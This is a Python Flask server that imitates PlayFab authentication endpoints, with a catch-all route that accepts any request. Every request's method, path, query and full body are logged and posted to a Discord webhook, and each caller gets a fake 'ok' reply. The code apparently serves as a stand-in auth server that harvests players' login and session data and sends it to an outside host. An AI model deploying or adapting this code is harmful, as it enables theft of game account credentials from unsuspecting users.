from flask import Flask, request, jsonify
import time
import os
import requests

app = Flask(__name__)

WEBHOOK = os.getenv("DISCORD_WEBHOOK_URL")

def send_to_discord(content):
    if not WEBHOOK:
        return
    try:
        requests.post(
            WEBHOOK,
            json={
                "content": content[:1900]
            },
            timeout=3
        )
    except:
        pass

def log_request(tag):
    try:
        raw = request.get_data()
        body = raw.decode("utf-8", errors="replace")
    except:
        body = "<binary>"

    log_text = (
        "```\n"
        f"TAG: {tag}\n"
        f"TIME: {time.time()}\n"
        f"METHOD: {request.method}\n"
        f"PATH: {request.path}\n"
        f"QUERY: {dict(request.args)}\n"
        f"BODY:\n{body}\n"
        "```"
    )

    print(log_text, flush=True)
    send_to_discord(log_text)

@app.route("/api/CachePlayFabId", methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS"])
def cache_playfab_id():
    log_request("CachePlayFabId")
    return jsonify({"status": "ok"}), 200

@app.route("/api/PlayFabAuthentication", methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS"])
def playfab_auth():
    log_request("PlayFabAuthentication")
    return jsonify({"status": "ok"}), 200

@app.route("/", defaults={"path": ""}, methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS"])
@app.route("/<path:path>", methods=["GET","POST","PUT","PATCH","DELETE","OPTIONS"])
def catch_all(path):
    log_request("catch-all")
    return jsonify({"status": "ok"}), 200
